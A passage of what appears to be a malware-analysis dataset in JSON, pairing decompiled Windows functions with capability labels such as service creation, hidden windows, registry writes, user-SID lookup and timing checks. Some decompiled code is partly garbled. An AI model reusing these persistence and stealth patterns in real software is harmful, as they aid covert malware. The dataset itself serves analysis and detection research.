pcVar1);\n        }\n        param_1 = NULL;\n    }\n    return param_1;\n}\n",
        "token_count": 910
    },
    "00404620": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404620(uint hSCManager, uint lpServiceName)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(hSCManager, lpServiceName, 0xf01ff);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    iVar3 = (*_sym.imp.ADVAPI32.dll_StartServiceA)(iVar2, 0, 0);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetLastError;\n    if (iVar3 == 0) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar3 != 0x420) {\n            iVar3 = (*pcVar1)();\n            if (iVar3 != 0x422) {\n                (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n                return 0;\n            }\n        }\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n    return 1;\n}\n",
        "token_count": 241
    },
    "00404890": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.00404890(void)\n\n{\n    uint uVar1;\n    \n    if (*0x42364c == 0) {\n        uVar1 = (*_sym.imp.MSVCRT.dll_time)(0);\n        (*_sym.imp.MSVCRT.dll_srand)(uVar1);\n        *0x42364c = 1;\n    }\n    return;\n}\n",
        "token_count": 83
    },
    "00404d60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00404d60(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.004042a0(arg_8h, 1);\n    return iVar1 != 0;\n}\n",
        "token_count": 54
    },
    "00402b30": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.00402b30(int32_t *param_1)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint *in_FS_OFFSET;\n    uchar auStack592 [260];\n    uchar uStack332;\n    uint uStack331;\n    int32_t var_44h;\n    int32_t iStack68;\n    int32_t iStack64;\n    int32_t iStack60;\n    uint uStack56;\n    uint uStack52;\n    int32_t iStack48;\n    uint uStack44;\n    int32_t *piStack40;\n    int32_t *piStack36;\n    int32_t iStack32;\n    uint uStack28;\n    int32_t *piStack24;\n    int32_t *piStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x405090;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    (*_sym.imp.ole32.dll_CoInitialize)(0);\n    var_44h = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x423574);\n    if (var_44h == 0) {\n        *in_FS_OFFSET = uStack16;\n        return 1;\n    }\n    uVar1 = (*_sym.imp.USER32.dll_RegisterWindowMessageA)(0x423580);\n    (*_sym.imp.USER32.dll_SendMessageTimeoutA)(param_1, uVar1, 0, 0, 2, 1000, &uStack28);\n    pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(var_44h, 0x423594);\n    if (pcVar2 == NULL) {\n        *in_FS_OFFSET = uStack16;\n        return 1;\n    }\n    piStack36 = NULL;\n    uStack8 = 0;\n    iVar3 = (*pcVar2)(uStack28, str._D_3, 0, &piStack36);\n    if ((iVar3 < 0) || (piStack36 == NULL)) {\n        uStack8 = 0xffffffff;\n        if (piStack36 != NULL) {\n            (**(*piStack36 + 8))(piStack36);\n        }\n    }\n    else {\n        piStack40 = NULL;\n        uStack8._0_1_ = 1;\n        iVar3 = (**(*piStack36 + 0x20))(piStack36, &piStack40);\n        if ((-1 < iVar3) && (piStack40 != NULL)) {\n            iStack32 = 0;\n            (**(*piStack40 + 0x24))(piStack40, &iStack32);\n            iStack68 = 0;\n            if (0 < iStack32) {\n                do {\n                    iStack48 = (*_sym.imp.MSVCRT.dll_rand)();\n                    iStack48 = iStack48 % iStack32;\n                    uStack56 = CONCAT22(uStack56._2_2_, 3);\n                    param_1 = NULL;\n                    piStack20 = NULL;\n                    uStack8._0_1_ = 4;\n                    iVar3 = (**(*piStack40 + 0x2c))\n                                      (piStack40, uStack56, uStack52, iStack48, uStack44, uStack56, uStack52, iStack48, \n                                       uStack44, &param_1);\n                    if ((iVar3 < 0) || (param_1 == NULL)) {\n                        uStack8._0_1_ = 3;\n                        if (piStack20 != NULL) {\n                            (**(*piStack20 + 8))(piStack20);\n                        }\njoined_r0x00402f6e:\n                        uStack8._0_1_ = 2;\n                        if (param_1 != NULL) {\n                            uStack8._0_1_ = 2;\n                            (**(*param_1 + 8))(param_1);\n                        }\ncode_r0x00402f7a:\n                        (*_sym.imp.OLEAUT32.dll_VariantCopy)(&uStack56);\n                        break;\n                    }\n                    iVar3 = (***param_1)(param_1, 0x4061b0, &piStack20);\n                    if (((iVar3 < 0) || (piStack20 == NULL)) ||\n                       (iVar3 = (**(*piStack20 + 0x38))(piStack20, &iStack60),  iVar3 < 0)) {\njoined_r0x00402f35:\n                        if (piStack20 != NULL) {\n                            uStack8._0_1_ = 3;\n                            (**(*piStack20 + 8))(piStack20);\n                        }\n                        uStack8._0_1_ = 2;\n                        if (param_1 != NULL) {\n                            (**(*param_1 + 8))(param_1);\n                        }\n                        goto code_r0x00402f7a;\n                    }\n                    if (iStack60 == 0) {\njoined_r0x00402d71:\n                        if (piStack20 != NULL) {\n                            uStack8._0_1_ = 3;\n                            (**(*piStack20 + 8))(piStack20);\n                        }\n                        uStack8._0_1_ = 2;\n                        if (param_1 != NULL) {\n                            (**(*param_1 + 8))(param_1);\n                        }\n                    }\n                    else {\n                        fcn.00402960(iStack60, auStack592, 0x104);\n                        (*_sym.imp.OLEAUT32.dll_SysStringLen)(iStack60);\n                        iVar4 = (*_sym.imp.MSVCRT.dll__stricmp)(auStack592, 0x4235a8);\n                        if (iVar4 != 0) goto joined_r0x00402d71;\n                        piStack24 = NULL;\n                        uStack8._0_1_ = 5;\n                        iVar3 = (***param_1)(param_1, 0x4061a0, &piStack24);\n                        if ((iVar3 < 0) || (piStack24 == NULL)) {\n                            uStack8._0_1_ = 4;\n                            if (piStack24 != NULL) {\n                                (**(*piStack24 + 8))(piStack24);\n                            }\njoined_r0x00402f1a:\n                            if (piStack20 != NULL) {\n                                uStack8._0_1_ = 3;\n                                (**(*piStack20 + 8))(piStack20);\n                            }\n                            goto joined_r0x00402f6e;\n                        }\n                        iVar3 = (**(*piStack24 + 0x20))(piStack24, &iStack64);\n                        iVar4 = iStack64;\n                        if (iVar3 < 0) {\n                            uStack8._0_1_ = 4;\n                            if (piStack24 != NULL) {\n                                (**(*piStack24 + 8))(piStack24);\n                            }\n                            goto joined_r0x00402f1a;\n                        }\n                        if (iStack64 == 0) {\n                            uStack8._0_1_ = 4;\n                            if (piStack24 != NULL) {\n                                (**(*piStack24 + 8))(piStack24);\n                            }\n                            uStack8._0_1_ = 3;\n                            if (piStack20 != NULL) {\n                                (**(*piStack20 + 8))(piStack20);\n                            }\n                        }\n                        else {\n                            uStack332 = 0;\n                            puVar6 = &uStack331;\n                            for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n                                *puVar6 = 0;\n                                puVar6 = puVar6 + 1;\n                            }\n                            *puVar6 = 0;\n                            *(puVar6 + 2) = 0;\n                            fcn.00402960(iVar4, &uStack332, 0x104);\n                            (*_sym.imp.OLEAUT32.dll_SysStringLen)(iStack64);\n                            iVar4 = fcn.00402a60(&uStack332);\n                            if (iVar4 == 0) {\n                                (*_sym.imp.KERNEL32.dll_Sleep)(10);\n                                (**(*piStack20 + 0x114))(piStack20);\n                                uStack8._0_1_ = 4;\n                                if (piStack24 != NULL) {\n                                    (**(*piStack24 + 8))(piStack24);\n                                }\n                                goto joined_r0x00402f35;\n                            }\n                            (*_sym.imp.KERNEL32.dll_Sleep)(0);\n                            uStack8._0_1_ = 4;\n                            if (piStack24 != NULL) {\n                                (**(*piStack24 + 8))(piStack24);\n                            }\n                            uStack8._0_1_ = 3;\n                            if (piStack20 != NULL) {\n                                (**(*piStack20 + 8))(piStack20);\n                            }\n                        }\n                        uStack8._0_1_ = 2;\n                        if (param_1 != NULL) {\n                            uStack8._0_1_ = 2;\n                            (**(*param_1 + 8))(param_1);\n                        }\n                    }\n                    (*_sym.imp.OLEAUT32.dll_VariantCopy)(&uStack56);\n                    iStack68 = iStack68 + 1;\n                } while (iStack68 < iStack32);\n            }\n        }\n        if (piStack40 != NULL) {\n            uStack8 = uStack8._1_3_ << 8;\n            (**(*piStack40 + 8))(piStack40);\n        }\n        uStack8 = 0xffffffff;\n        if (piStack36 != NULL) {\n            (**(*piStack36 + 8))(piStack36);\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_FreeLibrary)(var_44h);\n    (*_sym.imp.ole32.dll_CoUninitialize)();\n    *in_FS_OFFSET = uStack16;\n    return iVar3;\n}\n",
        "token_count": 2234
    },
    "00404060": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop",
            "set registry value",
            "get common file path"
        ],
        "decompiled_code": "\nbool fcn.00404060(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x423354, 0x423398, 4, &stack0x00000004, 4);\n    return iVar1 == 0;\n}\n",
        "token_count": 77
    },
    "00404da0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "get session user name"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404e22) overlaps instruction at (ram,0x00404e21)\n// \n// WARNING: Control flow encountered bad instruction data\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Removing unreachable block (ram,0x00404ebc)\n\nuint __cdecl fcn.00404da0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t unaff_ESI;\n    ushort in_SS;\n    bool bVar3;\n    uint *puStack848;\n    uint uStack844;\n    uint uStack840;\n    uint *puStack836;\n    uint *puStack832;\n    uint *puStack828;\n    uint *puStack824;\n    uint var_31ch;\n    uint lpBuffer;\n    uint var_114h;\n    uint var_10h;\n    uint pcbBuffer;\n    uint var_8h;\n    uint var_4h;\n    \n    pcbBuffer = 0x104;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_GetUserNameA)();\n    if (iVar1 == 0) {\n        return 0;\n    }\n    var_4h = 0x104;\n    var_8h = 0x104;\n    puStack824 = &fcn.00404da0::var_31ch;\n    puStack828 = &fcn.00404da0::var_4h;\n    puStack832 = &fcn.00404da0::var_114h;\n    puStack836 = &fcn.00404da0::lpBuffer;\n    uStack840 = 0;\n    uStack844 = 0x404e31;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_LookupAccountNameA)();\n    if (iVar1 != 0) {\n        puStack848 = &fcn.00404da0::var_114h;\n        uStack844 = arg_8h;\n        uVar2 = (*_sym.imp.ADVAPI32.dll_ConvertSidToStringSidA)();\n        bVar3 = (POPCOUNT(uVar2 & 0xff) & 1U) == 0;\n        if (uVar2 == 0) {\n            return 0;\n        }\n        if ((!bVar3) && (bVar3)) {\n            segment(in_SS, *0x10 + -0x350);\n            if (bVar3) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            *(((&stack0xfffffcb0 & 0xffff0000 | *0x10 - 0x34c) ^ unaff_ESI) - 4) = 0xb7bc9ea5;\n        }\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 612
    },
    "004016e0": {
        "rules": [
            "hide graphical window"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040172b)\n\nuint __cdecl fcn.004016e0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.USER32.dll_CreateWindowExA)\n                      (0, 0x411170, 0x423618, 0xcf0000, 0x80000000, 0, 0x80000000, 0, 0, 0, arg_8h, 0);\n    if (iVar1 != 0) {\n        (*_sym.imp.USER32.dll_ShowWindow)(iVar1, 0);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 154
    },
    "00404430": {
        "rules": [
            "get service handle",
            "create service"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404430(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_CreateServiceA)(arg_8h, arg_ch, arg_ch, 0xf01ff, 1, 0, 1, arg_10h, 0, 0, 0, 0, 0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n    return 1;\n}\n",
        "token_count": 138
    }
}